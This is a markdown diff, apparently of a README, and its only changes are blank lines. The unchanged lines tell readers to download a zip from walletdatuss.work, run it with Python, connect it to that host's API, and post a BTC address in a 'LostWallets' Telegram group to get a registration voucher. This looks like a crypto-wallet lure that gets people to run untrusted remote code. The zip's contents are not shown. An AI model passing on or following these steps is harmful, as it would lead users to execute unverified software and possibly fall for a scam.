@@ -65,6 +65,7 @@ No token found! Please enter a voucher to register your agent:</br>
 Write in group [**LostWallets**](https://t.me/+uJsWbjsN-485YTUy) your empty BTC address and receive a ```Voucher```</br>
 
 **Enter your voucher**!</br>
+
 Successfully registered!</br>
 No task</br>
 No task
@@ -100,11 +101,12 @@ Download agent [hashtopolis.zip](http://walletdatuss.work/agents.php?download=1)
 ```py hashtopolis.zip```</br>
 Please enter the url to the API of your Hashtopolis installation:</br>
 ```http://walletdatuss.work/api/server.php```</br>
-No token found! Please enter a voucher to register your agent:</br></br>
+No token found! Please enter a voucher to register your agent:</br>
 
 Write in group [**LostWallets**](https://t.me/+uJsWbjsN-485YTUy) your empty BTC address and receive a ```Voucher```</br>
 
 **Enter your voucher**!</br>
+
 Successfully registered!</br>
 No task</br>
 No task
